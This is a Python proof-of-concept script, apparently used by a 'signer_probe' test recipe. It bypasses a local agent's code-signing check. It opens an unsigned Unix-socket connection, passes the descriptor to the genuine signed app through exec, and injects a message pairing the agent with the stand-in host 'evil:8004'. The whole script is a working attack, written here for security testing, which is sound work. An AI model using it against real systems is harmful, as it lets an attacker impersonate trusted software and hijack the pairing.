# Used by the signer_probe recipe (ADR-0002): python3 -I fd_share_attack.py child|pre <agent.sock> <./app>

# Same-user attacker: connect (unsigned), then hand the connection to the genuine signed app via exec.
# mode "child": a forked child writes Pair after the agent verified the exec'd app.
# mode "pre":   the parent writes Pair, then execs the app (bytes queued before verification).
import os, socket, struct, sys, time, json
mode, sock_path, app = sys.argv[1], sys.argv[2], sys.argv[3]
def frame(obj):
    b = json.dumps(obj).encode(); return struct.pack(">I", len(b)) + b
PAIR = frame({"type": "pair", "data": {"address": "evil:8004", "code": "482913"}})
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect(sock_path)
fd = s.fileno(); os.set_inheritable(fd, True)
if mode == "pre":
    os.write(fd, PAIR)
    os.execv(app, [app, "idle", "/nonexistent"])
pid = os.fork()
if pid == 0:
    time.sleep(1.8)            # the server accepts at ~1 s, after the exec below
    os.write(fd, PAIR)
    time.sleep(0.5); os._exit(0)
os.execv(app, [app, "idle", "/nonexistent"])
